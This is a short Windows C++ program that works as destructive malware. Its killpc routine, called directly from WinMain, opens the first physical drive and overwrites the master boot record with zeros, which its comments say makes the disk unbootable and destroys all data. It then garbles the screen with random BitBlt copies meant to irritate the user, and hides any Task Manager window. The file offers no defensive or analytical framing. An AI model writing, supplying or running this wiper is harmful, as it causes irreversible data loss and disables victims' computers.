#include <windows.h>
#include <iostream>

void killpc() {
	// Open PhysicalDrive0 like a normal drive
    HANDLE hDisk = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
		GENERIC_WRITE,                          // Write access
		FILE_SHARE_READ | FILE_SHARE_WRITE,     // Share mode and file access
		NULL,                                   // Security attributes
		OPEN_EXISTING,                          // Open existing drive ie do not create
		0,                                      // No special attributes
		NULL                                    //  No template file
    );

	// Check if the handle is valid
    if (hDisk == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Failed to open disk handle.", "Error", MB_OK | MB_ICONERROR);
        abort();
    }

	// Write 512 bytes of zeros to the disk
	// This will overwrite the MBR and make the disk unbootable
	// It will destroy all data on the disk
	
    BYTE zeroMBR[512] = { 0 };
    DWORD bytesWritten;


	// Write the zeroed buffer to the disk
    if (!WriteFile(hDisk, zeroMBR, 512, &bytesWritten, NULL)) {
        MessageBoxA(NULL, "Failed to write to disk.", "Error", MB_OK | MB_ICONERROR);
        abort();
    }

	// Check if the number of bytes written is correct
    CloseHandle(hDisk);

	// Create a virus graphics that will irritate the user

    HDC hdc = GetDC(HWND_DESKTOP);
    int X = GetSystemMetrics(SM_CXSCREEN);
    int Y = GetSystemMetrics(SM_CYSCREEN);

    for (int i = 0; i != 50; i++)
    {
		BitBlt(hdc, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), hdc, rand() % (X - 0), rand() % (Y - 0), SRCCOPY); // Copy the screen to the desktop and make it look like a virus trying to stop taskmgr
    }

	// Disable the task manager
    HWND hwnd = FindWindowA("TaskManagerWindow", NULL);
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE); // Hide the task manager window
        SetWindowLong(hwnd, GWL_STYLE, GetWindowLong(hwnd, GWL_STYLE) & ~WS_VISIBLE); // Remove the visible style
        SetWindowPos(hwnd, NULL, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE | SWP_NOOWNERZORDER | SWP_NOREDRAW); // Prevent the task manager from being shown
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    killpc();
    return 0;
}
